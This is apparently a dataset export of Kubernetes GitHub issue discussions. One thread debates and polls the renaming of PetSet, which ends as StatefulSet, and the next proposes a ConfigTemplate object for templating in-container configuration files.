alpha object completely, or will there be an attempt to maintain conversions from alpha petsets to objects with some other name?  It is significantly harder to convert an entire type from alpha to beta than an annotation or field. We'd either need to autoconvert in apiserver or maintain 2 types, lock down edits to apps/v1alpha1, push the burden of converion on users, and teach the controller to understand both. I think we should drop on rename.  Those were among the ones I was expecting to see in the poll, alongside remaining with PetSet On Oct 19, 2016, at 624 PM, Tim Hockin notifications@friend.com wrote IdentitySet or NominalSet or RoleSet. — You are receiving this because you commented. Reply to this email directly, view it on GitHub  mute the thread  Ok, how about this?  I'll close the current poll and leave this thread here open for suggestions until 5pm tomorrow (Thursday 10/20).  At that time, I'll create a new poll and we can vote again. For additions to the current list, I have IdentitySet NominalSet RoleSet Regarding PetSet, from reading this thread it looks like the point is to change the name to something else.  Keeping it as an option would open up the possibility of not changing the name.  Thoughts?  How are we voting on this?  Voting is currently closed but will re-open tomorrow at 5pm with a new link (that I'll post here as well as email out to kubernetes-dev@friend.com). If you have more suggestions, you can add them here.  Thank you for deciding to vote on a new name. Obviously, I don't think keeping the current name should be an option. The technical work required to make the transition is largely a result of letting this issue sit open for so long. I opened the issue before PetSet was released as alpha, specifically so that it would be considered before the technical cost of changing became a bigger issue. Though there is precedent for leaving major features in alpha or beta for a long time to the point where they're de facto general availability (e.g. deployments), I don't think relying on anything about an alpha/beta feature is something we should encourage. They are alpha/beta for a reason things might change.  We have pretty explicit guidelines about support for alpha/beta - Jordan's comments are reasonable because breaking people has cost, and we generally avoid breaking people at all because it is far more impactful than a name. In this case we will break people, and take the corresponding hit. On Wed, Oct 19, 2016 at 739 PM, Jimmy Cuadra notifications@friend.com wrote  While there are strong opinions about the naming, that doesn't mean that the opinion is shared among the community uniformly.  I suggested leaving PetSet in the poll because there are people who have expressed to me a preference for the name, just like there are people who have expressed that they are offended by the name, or prefer a more descriptive name.  I'd prefer to be inclusive to a wider set of opinions rather than exclusive here. On Wed, Oct 19, 2016 at 1037 PM, Clayton Coleman ccoleman@friend.com wrote  I understand that some folks in the comminity would like to rename this software component. Frankly some people in the community would like to not rename it. Not having the option for voting to keep the name PetSet is not approaching this from the perspective of inclusion.  We are excluding people from the capability to vote to keep the name PetSet.  If we are a comminity we should allow all opinions to be heard. We need to be able to agree to disagree. Renaming the feature is understandable, excluding people for voting to keep the name is... Ah I digress. Also, what is the plan to re-educate people if the name does change? There is going to be a cost to companies that are already using this component. How is that going to be addressed? If this is renamed are we going to do a breaking change or deprecate? And lastly, why are we not using an online voting tool? Transparency is a beautiful thing. @friend who can address the above concerns? Again I do appreciate this community greatly.  Clayton's kubecon talk )  I am thinking of calling my lightening talk at kubecon - The feature formerly named PetSet. In all seriousness it is an important question. Lots of people have been making Pets.  A few quick responses 1) We are using an online voting tool with ranked-choice voting once we have the list of contenders.  Everyone can see the list of choices as well as what is winning (after they place a vote).  The link was in the original message earlier today with the initial set of vetted choices but was pulled in favor of allowing more community members to contribute more choices. 2) PetSets has some strong reaction from both sides so I'm trying to work through both groups of opinions that I'm getting on inclusion / exclusion.  I get the inclusion logic.  The exclusion logic is that it looks like from this thread that there is potential for it to be offensive so we should change it and not have it as an option. 3) As for implementing the change, the engineers working on this want to have a new name settled ASAP so that they can get to work on it and design it. 4) Since a lot of people have been making pets, if a change is going to be made it needs to be made now.  It looks like ideally we should have made the change sooner (before alpha launch) but we are where we are, etc.  When we rename petsets, I expect that alpha support will be dropped. Kubernetes 1.4 will have apps.v1alpha1.petset. Kubernetes 1.5 will have apps.v1beta1.otherthing.  It won't have anything called petset and it won't remember your petset objects from when you were running 1.4. Users will need to GET and then DELETE their PetSets, edit the manifest and then upgrade their clusters to 1.5, and then POST the NewThing. It might seem simple to support two different names concurrently. However, based on experience with extensions.v1beta1.job and batch.v1.job and batch.v2alpha1.job, I do not believe we can do this in the time before 1.5. A key purpose of alpha is so that developers do not have to do headstands when they make a change that is difficult to make backward compatible.  Supporting the old name and the new name at the same time is going to require a headstand.   Feel free to prove me wrong with a PR.  The only justification anyone has presented for keeping PetSet is the technical and educational cost of changing code and marketing material for a feature already being used by some people. I respect that, and think that is a very valid reason to consider not doing this, but I think the argument that not allowing people to vote for PetSet is ""excluding people's opinions"" is really putting energy into the wrong place. The goal here shouldn't be to support some perfect democracy for the sake of ""community."" The fact that there has been four months of discussion on the topic is community. @friend has already said that the Kubernetes team has decided to change it. Let's just do it and move on.  I've followed the discussions on this and the other issue, and while there were a lot of thoughtful arguments made, it doesn't feel like we are converging.  So, further discussion doesn't make much sense.  And we have limited time for it before beta.  And I see getting to beta sooner as more valuable than having the best possible name. Several of the arguments for various names are about how words evoke certain ideas in the minds of our users.  Rather than postulating about what is in our user's minds, a poll seems like a good way to find out directly. Therefore, I asked Dan to conduct a poll. My intent in conducting a poll was not to determine whether or not PetSet is offensive.  I don't find it offensive, but I can see how reasonable people might find it offensive, and I don't think Kubernetes should offend even a small minority if it can reasonably be avoided.  Therefore, PetSet is not included in the poll. The purpose of the poll was to determine from among the not-known-to-be-offensive options, which one made the most sense to people.  @friend issue is openned for PetSet transition / upgrade path.  users will need a path to migrate to the new objects, without downtime.  Dan, On #2, how about adding an option for “Do not change” instead? Maybe slightly less biased. I’m not a professional pollster or statistician, but if someone knows one it wouldn’t be a bad idea to consult them. Ike  Umm, all those changes that that kubernetes team and users of this feature will need to do (huge amount of time and money) is putting energy into the wrong place in my opinion. Correct - conducting a poll should be to determine if the name should stay or not - not including PetSet or Do not change anything option is WRONG and non transparent. Let the people vote if they want to invest time and money to do that change - unless you already decided that it will change - it's your product at the end. There always will be people that will be upset.  @friend who can handle a PR on the questions that I have raised here I opened a PR on upgrades, and non-breaking changes, someone else needs to run with this one.  There are both education and marketing problems that we are creating.  We are creating technical debt for companies that have already used this tool.  Surely whoever writes the PR should choose the new name?  It's thankless work, so the person that writes the PR should at least have that reward -)  The current list is.  Please let me know if you'd like to suggest another name. StatefulSet StatefulArray Stateful StatefulApp PersistentInstanceSet PersistentInstanceArray IdentitySet NominalSet RoleSet A new poll will be created later tonight (after 5pm).  @friend Synopsis of PetSet for vote PetSet is a Kubernetes API resource type intended to facilitate deployment and management of stateful applications (e.g., databases, key-value stores) and other workloads that require distinct, stable network identities and/or storage for each instance  primarily distinguishes PetSet from other workload-management APIs in Kubernetes such as Deployment and DaemonSet is that the Pods it generates have predictable, stable names and that it can generate PersistentVolumeClaims in addition to Pods.  @friend / @friend / @friend  who is the PM who manages priorities with PetSets from the google side of the house?  I know @friend is in the middle of this, but I am not sure who are the full list of owners.  Who at a product owner level owns this, and where is this work listed for this?  Are we talking about 1.5 a timeframe or beta timeframe?  When is 1.5? I would say that we need to update  is a blocker / and maybe a breaking item, and I am wondering if we should recommend pushing this out more.  The last thing that I want is this shoehorned in. This is getting people a tad upset.  Not doing this properly will cause C-Levels to break out torches and pitchforks.  @friend did we lose PersistentSet deliberately? Also, I think not including PetSet as a choice risks prolonging this.  If we want to change the name soon, we should not exclude the option.  Yes, ""Persistent.."" is shorter than ""PersistentInstance.."", please include it.  1.5 code freeze is in 3 weeks (11/7) with the launch planned for December. I'm in the PM for Petsets on the Google side working with @friend. PersistentSet was changed to PersistentInstanceSet because PersistentSet is too general and can be confused with PersistentVolumes so ""Instance"" was added to remove some of the confusion. It does get to be harder and harder to change as time goes on so we're trying to get this done before beta.  We're trying to get PetSets into beta for 1.5.  @friend is PM on the issue from Google, but, to be clear, this is a community and he/I/everyone here is just voting. We (at Google) don't ""own"" anything. We're just trying to close before 1.5.  Here is the latest PetSet is a Kubernetes API resource type intended to facilitate deployment and management of stateful applications (e.g., databases, key-value stores) and other workloads that require distinct, stable network identities and/or storage for each instance  primarily distinguishes PetSet from other workload-management APIs in Kubernetes such as Deployment and DaemonSet is that the Pods it generates have predictable, stable names and that it can generate PersistentVolumeClaims in addition to Pods. Here are some potential alternate names for this resource type StatefulSet StatefulArray Stateful StatefulApp PersistentSet PersistentArray PersistentInstanceSet PersistentInstanceArray IdentitySet IdentityArray NominalSet NominalArray RoleSet RoleArray As for the inclusion of PetSets, a few people pointed out to me that they'd like it excluded citing the code of conduct as they find this offensive and not fostering an open and welcoming community.  maintainers have the right and responsibility to remove, edit, or reject comments, commits, code, wiki edits, issues, and other contributions that are not aligned to this Code of Conduct, or to ban temporarily or permanently any contributor for other behaviors that they deem inappropriate, threatening, offensive, or harmful.""  contributors and maintainers of this project, and in the interest of fostering an open and welcoming community, we pledge to respect all people who contribute through reporting issues, posting feature requests, updating documentation, submitting pull requests or patches, and other activities.""  Where do we nominate alternative names? I'd like to nominate CatArray Reasoning cats are solitary, independent creatures with eccentric personalities. They are also particularly famous on the internet. The metaphor would be to contrast cats' evolutionary strategy with a school of fish, herds of bison, flocks of geese, etc which attempt to protect themselves from predators on the basis of their numbers.  @friend you own your staffing and resource allocation )  We are on the same playing field.  Thanks for cleaning up what I said. @friend We probably need to take this discussion to another issue, please feel free to move it.  Does that mean in 1.5 the name is changing?  In this case I demand immediate removal of all the references to that words that are extremely harmful/offensive/inappropriate to people with afro-american roots. This means - removal of all words that contain 'master', 'slave', 'black' (as being something worse) and 'white' (as being something better) in the context of 'master-slaves', 'whitelists', 'blacklists', 'black holes' etc. Here are the links that are part of the kubernetes project that are harmful  stated by OP I am not Just trying to talk common sense. but if we want to be super a**lretentive then my statement is equally (if not more) appropriate - as they concern humans.  @friend That is a reasonable request but should probably be opened as a separate issue. You can reference this one for context.  Please stop.  Derailing the conversation with additional demands does not help us resolve this issue of what to change the name to.  We have had multiple requests for varying reasons to change the name of this feature. If you have ideas for names that represent the feature succinctly and are not intended to be humorous or sarcastic we welcome your contributions.  if not, your comments are a distraction to an already complicated debate.  @friend and @friend I added some postscript above to clarify that my proposal is serious. Also thank to you both for doing a great job thus far with a very complex and sensitive situation. I am impressed with your patience during this process!  @friend / @friend when is voting again.  Asking for interested developers.  Dan had said he'd post a new poll at 5 PM (assuming Pacific.) Should be up in just a few minutes.  Voting will start up again later tonight.  I'll put a link here when it's ready.  There are still some discussions going on so we'll see if this thread gets updated with more thought but if not, I'll collect everything and create a new poll for voting.  @friend Hey Erick -- This is a community, so you have a right to do whatever you'd like, but I would like to implore you to withdraw CatArray. In my opinion, the primary reason to change the name is not the initial reason that was proposed in this thread, but that PetSet is cute and totally indecipherable by anyone who does not understand the Pets v. Cattle analogy. CatArray falls into this camp.  I would like to add that I'm uncomfortable with having to understand the behaviour of cats, dogs, cows, and other animals in order to grasp a technical concept in Kubernetes. Its maybe obvious to people who are familiar with animal behavior but I think many people are not. Also I really don't like thinking about killing and predators and violence and so forth unless I have to. Just a personal opinion.  @friend and the window will close when?  I assume this is going to be the ""vote"" and we are not going to do this again.  We need to put this to bed.  This is turning into an optics nightmare.  I'll create a poll today (having some issues with the website that creates the poll) and the voting window will close on Monday 10/24/2016 at midnight. I'd like to leave CatArray off the list.  @friend Not sure where you are getting this from - but there is nothing humorous / sarcastic in whatever I posted. This is very serious matter. Is there a double standard ? My point is - there is NOTHING harmful in  name - there is not even a single mention of  in that name. If the  metaphor is harmful - then just change that 3 (or more) articles that kubernetes team posted about it - and just describe PetSet as things that you 'know about, name, know every charactersistc of them, have handful of them' or whatever. Just let people to vote for that - as I said - because there is nothing hateful in name itself 'PetSet'. There is a lot of effort and money spent by both kubernetes team and users - that at least they should have a chance to vote on that.  @friend thanks for letting us know that is was sarcasm.  People are taking this a tad serious.  @friend Thanks for the answer - but as I said - it wasn't a sarcasm. I'm also taking it very seriously.  I agree that CatArray is a cute name, and if the goal is to avoid cute names you can exclude it from the poll.  Thank you everyone! I create a new poll.  The link is below.  I will also share this link in the kubernetes-dev@ email list and the slack channel tomorrow.  let me know if you think anything is incorrect, etc.  Thanks again.  Have we considered the abbreviations for each of these?  RoleSet = rs, which is already taken by replicasets.  StatefulApp &amp; StatefulArray  = sa = serviceacount. NominalSet = ns = namespace.   Some of the alternatives also have unfortunate abbreviations.  I can't see StatefulSet being an acceptable choice, as a particular example.  @friend well we can only hope StatefulSet does not win. But we can be creative with the abbreviations as well  I'm not a fan of ""Stateful"". It seems orthogonal to the problem currently solved by petset. Cassandra and gnatsd are examples of applications that are highly stateful and run just as well in a replicaset as they do in a petset. HDFS datanode is a highly stateful app that is suited to run as a daemonset. A petset might also be used to partition work between a group of stateless workers where the partitioning is decided by the pet's index. Stateful is a common but not defining characteristic of applications that run well in ""petsets"". There are stateful apps that are not suited for petsets. There are stateless apps that are suited for petsets.  Anyone who's running a poll - can you please make sure to have  on it? I, for one, quite like the name, and would like to ensure people who share this opinion are not excluded from voting by a mindset of ""it must be changed""  Totally agree with @friend  So disappointed by @friend / team's decision by excluding  option - even when there are multiple people on this thread that would like to have a right to vote for this option.  Let people vote for it and let it ""die democratically"" if people don't vote for it. By excluding it you are making this entire process unfair, biased, non-open/transparent. There are so many arguments in favor of  and literally no valid argument against it (except some heavily stretched attached stories in the introductory post). Just distance yourself from 'pet vs cattle' metaphor and if anyone asks what is  just explain it is wonderful shortcut for ridiculously long  or Yea - sure - by excluding  from the list - not sure what kind of community you mean Anyway - thanks for the great product and have a nice day  I haven't followed the whole discussion, but  looks IMHO like a better choice than any of the proposed ones in the poll (why do we even consider ?). I also agree that ""pet vs. cattle"" analogy might be misleading, but it's not a strong argument for me. I'm refraining from voting in the poll right now as the original  is not even on the list disappointed  @friend @friend @friend can you help me understand more? As we've said, the issue is not solely the concerns at the top of the thread. PetSet is inherently a bad name because it is both ""cute"" and ""does not implicitly describe the functionality of the object."" Further, it requires understanding the ""Pets vs. Cattle"" analogy, which should not be required reading for running a distributed system like Kubernetes. If I'm missing something, please let me know!  @friend my 2 cents  the name probably should end with ""Set"" to be consistent with ""ReplicaSet"" (reading the thread I now understand the ""*Array"" proposals, but they are not intuitive to me at first) it should be memorable it should be rather short its acronym should be compatible (no conflicts and not ""unfortunate"" like ""SS"") pets might be cute, but how can a little bit of cuteness be bad in this cruel world? smirk_cat  pets deserve our special care, so it somehow describes a property intuitively (no need to know the whole ""pets vs. cattle"" analogy) I like the proposal ""PetSet, redefined as an abbreviation/backronym of PersistentSet (""Pe't"")"" I don't like having a poll with a curated list which excludes the original name (that just sounds neither transparent nor fair to me) ""PersistentSet"" comes closest for me, but it's not consistent (""ReplicaSet"" == ""Set of Replicas"", ""PetSet"" == ""Set of Pets"", but ""Set of Persistent""?)  For me to understand how big is the pain with the current naming really (maybe just a poll to find out?)? I personally just don't see the pain outweighing the hassle of changing to another subpar solution. BTW I just came here because the poll was posted in Slack and I first thought ""oh cool, a naming poll smile"", but then I saw the available poll options disappointed  @friend now my 2 cents  Regardless of the name  everyone in the community should be treated equally every voice should be listened to - not just selected part of the community process should be open, fair, transparent and objective (that's something that I guess everyone expects from the open community) Title of this issue is 'Please consider changing' - naturally it seems that one option to vote for should be 'No, do not change'   Regarding PetSet name arguments that are unquestionable  It's already here A lot of docs/articles/tutorials A lot of users/companies invested time/money  ""breaking people has cost, and we generally avoid breaking people at all because it is far more impactful than a name."" by @friend from RedHat     Arguments for PetSet name which are mostly subjective - hence it should be allowed for users to express their opinions and be able to vote for A lot of supporters of that name in here (including members of kubernetes team) - excluding all those users is unfair 'cute', 'too cute', 'bad because cute' is very subjective For me the name is perfect, short, memorable - I like to treat my computer and ""special"" servers as something I care about   There does not have to be ANY association with 'vs cattle' analogy There is no perfect name (otherwise there wouldn't be any discussion/poll) Proposed names are not better and don't really ""describe the functionality of the object"" Stateful? Nominal? Identity? Array? They might create even more confusion that one would hope for        There also might be people that are not in love with the name but think it's good enough (not worse than proposed ones) and price of change is too big to justify the change - so excluding ""Do not change anything"" in the poll is also unfair. If the name is as bad as you (personally) think it is - then the poll will verify it and it will get rejected - but at least process will be fair and objective Thanks for consideration  I'm personally a fan of PetSet. When I first saw it in the documentation I knew exactly what it was for and what problem it solved before I even read a word about it and how often does that ever happen?  It also seems more succinct than any of the alternatives so far. It could be argued that the vast majority of people in the container community will understand the analogy and that anything that can be done to make kubernetes concepts easier to understand by building on existing concepts will reduce the overall bandwidth spent answering questions that could be spent making PetSet's even better ) I'm certainly not opposed to a name change, I just hope it will be for a better, more succinct name since names really are important. )  I know people probably don’t want even more choices at this point but, after reading again recent arguments and looking at the options in that poll, I wonder why I haven’t seen OrderSet - os OrderedSet - os OrderedInstanceSet - os IndexSet - is IndexedSet - is IndexedInstanceSet - is SequenceSet - seq SequencedSet - seq SequencedInstanceSet - seq OrdinalSet - os Key point Noun (not Adjective) It’s important that the name reflects what the abstraction actually represents and establishes expectations. Just stirring things up on an otherwise boring Saturday )  @friend I noticed that the polljunkie summary scores do not seem to make sense when compared with the downloadable votes. I encourage you to use the Export to CSV option and crunch the numbers yourself to find the Condorcet winner.  Thanks for the info.  I'll download the csv as well after midnight on Monday night.  The whole idea of renaming, because of pets should not be replaced (kill and create) is a bit crazy to me. As german I have to say that having shortcuts like ""ns"" [1] and ""sa"" [2] are much more offending than ""PetSet"". I totally agree with @friend @friend @friend . [1]   @friend it seems unfair to the conversation to compare two letter acronyms as similar to an intentional metaphor. The question is whether the ""pet"" term lends itself too naturally to the phrase ""vs cattle"" as discussed from the beginning or whether it stands on its own as @friend discussed. I still like pet since it makes me think of my pets, which I do value more than other animals. That's my preference, but I'm happy with how open the discuss has been and I'm thankful our community is rising to the occasion to find a democratic process. Thanks again to @friend for all the hard work!  Minor observation  can just as easily use  as a shorthand rather than the suggestions above for  again, for those of us who like short names  The poll result is official? PetSets are StatefulSets now?  I think that chosen  is very bad name, what if I have stateless ?  @friend do we have results?  I need to rename a talk at kubecon  Yes, I am crunching the final tally to find the condorcet winner which may or may not be consistent with the polljunkie results (which uses a different method).  I'll update later today.  I think what redis did here is worthy of thought  we talk about PetSets, we have an opportunity for advocacy.  Talking about things and giving them names is the only way to effect change.  I have never thought more about cattle and where meat comes from than I have since the pets vs cattle analogy came about.  We don't need to endorse the analogy, but stopping using the words removes that thought from my mind. @friend what is a successful outcome here?  Yes Chris. That was my main concern when I first posted on this thread. But how big of a debt is it really? I mean, this is still beta, and it’s only been out for a few months. I’m not saying the cost is zero. There are clearly many documents, blog posts, tutorials, videos, etc. already out there. My point is that it’s only going to get worse. And if we’re going to make a change it should be done now.  I know people probably don’t want even more choices at this point but, after reading again recent arguments and looking at the options in that poll, I wonder why I haven’t seen OrderSet - os OrderedSet - os OrderedInstanceSet - os IndexSet - is IndexedSet - is IndexedInstanceSet - is SequenceSet - seq SequencedSet - seq SequencedInstanceSet - seq OrdinalSet - os Key point Noun (not Adjective) It’s important that the name reflects what the abstraction actually represents and establishes expectations. Just stirring things on an otherwise boring Saturday )  PersistentPodSet?  My own analysis of the 77 votes cast so far shows that  is the runaway winner, by the Condorcet winner criterion. The pairwise comparisons ( vs. X) were plus one5 v. PersistentSet plus one9 v. IdentitySet +27 v. NominalSet +35 v. PersistentInstanceSet +37 v. IdentityArray +39 v. NominalArray +43 v. PersistentArray +43 v. PersistentInstanceArray +45 v. RoleArray +47 v. RoleSet +47 v. StatefulArray +53 v. StatefulApp +65 v. Stateful In any event, #35534 is already open to track renaming to .  I finished crunching the numbers and the winner is StatefulSet. It won via multiple methods - average position (polljunkie) and condorcet using completion rules Schulze/Beatpath/CSSD, CIVS Ranked Pairs, MAM, Condorcet-IRV. There is sometimes a bit of variation on the ordering after the top but the top is always StatefulSet. The new name for PetSets will be StatefulSet. I am truly sorry that some folks were displeased with the processes, transparency, and choices.  Hopefully we can do a much better job next time should such a need arise.  I'll take the todo to formalize some of the name decision processes and get that adapted to api_change.md.  We have a set of guidelines for names (some of which we helped describe here) and that will help make the future process for name changes smoother. Marking as resolved - thanks everyone for keeping this civil, even if there were some bumps.  @friend would be great if you consider the old name in the next poll. I don't really care about names, but if you break backwards compatibility, because of renaming then I care.  @friend having a defined process about re-naming I think is worthwhile. Think it would have helped with some of the bumps.  Appreciate u taking that on  I'll take the todo to formalize some of the name decision processes and get that adapted to api_change.md.  We have a set of guidelines for names (some of which we helped describe here) and that will help make the future process for name changes smoother. On Tue, Oct 25, 2016 at 608 PM, Dan Paik notifications@friend.com wrote  @friend if you can have a PR / issue open for comment about doing so, that'd be swell (and link it in this issue)  Renaming to StatefulSet  There is the question of how we decide the name.  I don't think voting turned out to be a good way to do that. There is also the question of how rename impacts users.  We will see how the ""delete alpha resource"" impacts users when they upgrade their clusters to 1.5 and StatefulSet.   We may decide that pattern is too costly.  If so, we should invest in the API machinery to allow us to concurrently host the old Kind and the new Kind (in cases when the representations are intraconvertible). @friend we talked about this topic recently.  @friend your proposal will cover both those topics? (and more, I suspect, knowing you 😄 )  Yeah I plan to early next week. On Thu, Oct 27, 2016 at 218 PM, Eric Tune notifications@friend.com wrote ",261,307,2051,0,0,1710,73,
kubernetes/kubernetes/30716,0.040038061,kubernetes,kubernetes,Proposal: Template object for in-container configuration files,43149,401,285,0,15,"Summary I would like us to get rid of custom entrypoint.sh scripts by supporting templating of in-container files. The Problem Despite current ConfigMap features, it remains necessary for many or most container images under Kubernetes to include ""entrypoint.sh"" scripts and/or customizations to the containerized applications which are particular to the Kubernetes environment.  This results in forking of upstream images and limits portability of images between environments.  It also results in some very hackish startup scripts (see Kelsey's ""init scripts for hipsters""). Based on feedback through numerous issues and PRs, the main shortcoming in ConfigMap which would allow elimination of entrypoint scripts is the inability to include elements into a configuration file which are only available at deployment time.  For example, some services, such as clustered databases or load balancers, need to know the Pod IP or the pod name as part of their configuration. Suggested Solution ConfigTemplate Several proposals have been made to enhance ConfigMaps to embrace templating functionality, and they have met with significant opposition. My proposal is that we create a new object ... named here a ""ConfigTemplate"" as placeholder until someone suggests a better one.  This Template object would produce a file inside the deployed container, and could consume the Downward API, Secrets, and ConfigMaps in order to populate a template.  This would be largely the same as PR #30502, but with a new object type instead of overloading ConfigMaps. At a sketch, a ConfigTemplate for an ini-style config file could be inlined, and might look like this Note what syntax we use for the exact substitutions is unimportant; let's just use whatever is easiest to support/code. For inline versions, it is likely that only key $value substitutions would be supported.  For more complex behavior, including differently-formatted configuration files, we'd support file-based substitution, ala The file in question would be some kind of text file, with substitution tags in whatever syntax we decide on.  Either way, the ConfigTemplate would then be used inside Pod definitions like this Why not volumes? You'll notice above that I'm not taking a regular ""volume"" approach to this. That's because in many cases ... including some cases I have personally ... the rendered config file needs to share directories with files which come from the container image.  Doing this in a volume is complicated, and will lead (again) to custom entrypoint.sh scripts. However, if there are strong reasons to handle this as a volume, that could be worked around. Templating Engines and Sidecars There is some discussion about how templating would be handled and what templating engine we'd use.  This includes a suggestion by @friend that this be entirely sidecar functionality. I will argue that providing config file templates which allow containers to start inside Kubernetes pods without modification is fairly central functionality to what Kubernetes does, and as such the general Template object should be a core Kubernetes object.  However, I can certainly see the value of allowing the user to plug in their choice of rendering library for the actual template rendering for file-based templates; if nothing else, it would forestall a lot of arguments about syntax. Even in that case, however, I would like us to provide a built-in very simple template renderer, one which is capable of just swapping in upstream facts for some specific variable syntax, such as ${fact} or {{fact}} or similar, and nothing else.  Such a built-in renderer would satisfy 90% of users, and not push the user into installing extra dependencies. Alternatives I cannot personally think of any alternatives which will lead to the elimination of the majority of entrypoint.sh scripts.  Suggestions welcome. References  PR #30502 Issue #29607 Issue #28560   cc @friend @friend @friend @friend @friend @friend/rh-cluster-infra  How far can you get using an init-container? For example init-container consumes data from a configmap, substitutes values, and writes the resulting complete config file to a a path in an EmptyDir.  The main container reads the config file generated by the init container.  @friend I've tried to address init-container suggestion in a separate thread, it works for initial configuration. In the future, If we want to allow proper config change handling, it would be better to have it natively supported by Kubernetes ecosystem.  @friend two comments on init containers  we'd need to automate that process via some kind of Kubernetes object; otherwise it would be just a case of moving the burden on container image authors without decreasing it (in fact, we'd be increasing it).  If Template works via an init container under the hood, that's fine with me.  See my note above about the issues with volumes and config files.  In many cases, you want to only update 1 config file in a directory which may have several of them, such as for Postgres or Apache HTTPD or network-config.  Currently AFAIK there's no way to ""share"" a volume directory between files supplied by the image and files from the volume.  That would put users in the position of needing to re-create all of those config files, even if most of them are identical to the ones in the upstream image.  Which would then lead to out-of-sync issues if fixes are added to the config files in the upstream image.  Possibly merging the directories could be handled by the init container?  That is, it would pull files from the template, and the rest from the upstream image?  That would solve that issue, at least.    Image volumes have been requested - in the future that would address #2 as well.  In the short term we've said use an init container to handle that. On Wed, Aug 17, 2016 at 300 PM, Josh Berkus notifications@friend.com wrote  Devils advocate - why can't you provide a custom Command to the container and apply the transformation in that container?  The entrypoint would then be in the pod definition, not the image.  While I'm sympathetic to templated config map, you can already templatize in Command and Args (IIRC), so this is already possible.  Would be If config map was a valid target for env valueFrom (which it should be, because of secrets), then this should allow you to at least craft templates without changing the image.  That strikes me as unsatisfying for a number of reasons First, it means sharing the configuration is harder -- with a ConfigTemplate, you can just say , and mount as a volume (and edit the template when necessary).  With this approach, you have to say ""go in to your pod, convert the entrypoint back into a single string, then put your environment file in a HEREDOC with cat, and the append the existing entrypoint, and hope you didn't screw anything up in there with quoting, because your entrypoint is now a big string blob instead of an array of arguments"". Secondly, it makes sharing the config harder -- you can just share the config template as standalone object, you have to share it as part of the pod spec, and then the receiver has to extract the relevant parts from the pod spec. Also, it makes the entrypoint on an image much harder to read -- you go from just having a command to having a chain of commands that do  and  and , and then launch the actual image.  That seems easy to mistype and misread.  Templates of config are pretty closely coupled to pods.  You can always put the template in the config and combine them in the pod. The entrypoint is under the control of the pod author.  If the pod author doesn't control the image, they can control the entrypoint via the pod definition.  I'm fairly sure that we can provide an idiomatic representation of config templating in the pod template, which does allow references to other resources.  I am very skeptical of configmaps that point to other configmaps, so it's a much harder argument to say that we want to support references between a config map and another resource AND support references between pods and config maps.  Generally our answer to this has been - ""init containers"".  Given that gives you access to a turing complete space, and everything we provide in a config map can be transformed, you can use any templating language you want, combine any config map you want, and control it all, without any changes to kubernetes.  The alternative - implement  - requires us to bless a templating language and implement additional code.  Why is ~200 chars of init container definition in the pod worse than ~200 chars of a configtemplate definition?  As a note - my point here is not to dismiss ConfigTemplate out of hand, it is merely to ensure that the mechanisms that we have that should be able to solve this actually solve this in a clear and demonstrable way.  If they don't, they absolutely must be fixed.  @friend can you give an example of an init container implementation, using current Kubernetes?  Because my experience is that they're more complicated than you describe.  But maybe I'm doing them badly.  A few thoughts. First, a new object on its own does nothing for you.  You still need a new volume driver to project it into the FS.  given that, I don't think you actually need an API object at all.  What you have described looks like a volume. Second, there are tricks that can pull files from multiple volumes (secret, configmap, downwardapi) and project into a single directory, with the caveat that auto-updates don't work (bind mount semantics bite us).  If this is really a stumbling block, we can consider a way to project from multiple sources into a single volume.  @friend and I already sketched it out. Third, there are ways to inject a new entrypoint.sh into a container.  You can make a configmap with a key named  and the value being a shell script.  Mount that on /entry, and make your container's  be /entry/entrypoint.sh.  You don't need to customize upstream images for this.  If this is not satisfying, I would consider a ""literal"" volume driver that just copied a string into a file. Fourth, I didn't grok why a sidecar doesn't work?  Declare an emptydir called /config.  Mount it on both the sidecar and and the main app container.  The sidecar also mounts N configmaps and secrets and downward API.  The sidecar periodically evaluates a template (maybe a configmap or a flag) and fills in variables from the other configmaps and secrets.  It writes the results to /config/.config.tmp, compares /config/config.file with that tempfile and renames the tmp to the real name if needed.  The app container just watches inotify for changes to the /config/config.file. Lastly, nothing stops you from using third-party resource and flex volume to implement this yourself and prove us wrong.  If it turns out to be overwhelmingly popular we can either adopt it as standard or just endorse your cleverness ) On Wed, Aug 17, 2016 at 346 PM, Josh Berkus notifications@friend.com wrote  @friend I'm not looking to make this possible, I'm looking to make it simple.  It's possible now, but a large number of our users can't figure out how to do it.  And this is a spec issue, so the purpose of this is ""let's determine the spec for this"". Projecting configuration files into running containers is something our users need to do for something like 3/4 of running containers.  Right now the standard approach for that is hackish entrypoint.sh scripts, which is a terrible state of the art, and causes a lot of folks to legitimately question whether they made a mistake moving away from CMS and towards orchestration. Something which 80% of our users need to do 75% of the time shouldn't be complicated or require advanced Kubernetes knowledge. It should be simple, obvious, and there should be a recommended mainstream way to do it.  Whether that's templates or config volumes or sidecars, I don't really care, provided that it's something which a new Kubernetes user can learn in 20 minutes.  No disagreement, but we should first explore refinements on existing behaviors before piling on new abstractions and API kinds. On Thu, Aug 18, 2016 at 903 AM, Josh Berkus notifications@friend.com wrote  I'm OK with that.  Would you be willing to sketch out a doc on how you'd do it, now?  Because you seem to find existing approaches easier than I do.  I have zero bandwidth for the next few weeks.  We need community folks like yourself to come up to speed on alternatives and help make educated designs.  As much as I like having an opinion on everything, there aren't enough hours in the day.  The way this community grows and thrives is when new people step into the light and own problems ) I appreciate your vociferous advocacy of the user in this issue, so far... On Thu, Aug 18, 2016 at 920 AM, Josh Berkus notifications@friend.com wrote  I have created a simple PoC for configmap templating here  solution however uses downwardAPI volumes and the configfiles are simple another possible item type that can be used there. Your idea with bare files that can be placed anywhere seems to be superior. I don't know however how it would be with implementation. Also what would be the possibilities to implement some improved change propagation.  @friend I hear you.  Well, anything I do on this will need to come after CNCF day ...  Definitely plus one to @friend words. This is very important topic (that's why @friend and @friend made PoCs), it definitely should be easy and understandable to end user. I'm pretty sure that assumption that you can store configs in  is valid only in perfect world, but in reality it's not that easy. In my opinion any solution which uses init-containers, custom init scripts, init-containers to do templating feels hacky and requires serious k8s knowledge or pollutes pod/container definition with logic that shouldn't be there.  About initscripts besides ""feeling hacky"" the problem is they lack DRY-ness. You need to specify the data twice. First in the pod definition. Second - in the script. So your deployments become harder to maintain. My proposal Let's add an ability to add config file templates. These templates will be able to consume data from the following sources  Configmaps Secrets Pods  The templates will use syntax based on  package (I believe it is powerful enough for our needs). The template can be  Specified as inline data in the definition file In an external file referred by filename relative to the location of definition file.  The files can be inserted to the pod in two ways  Mounted separately in any place (at least Docker supports single file mounts) Added to DownwardAPI volumes  The ""DownwardAPI"" volume could be renamed if it is confusing to newcomers. Generally however the original DownwardAPI and 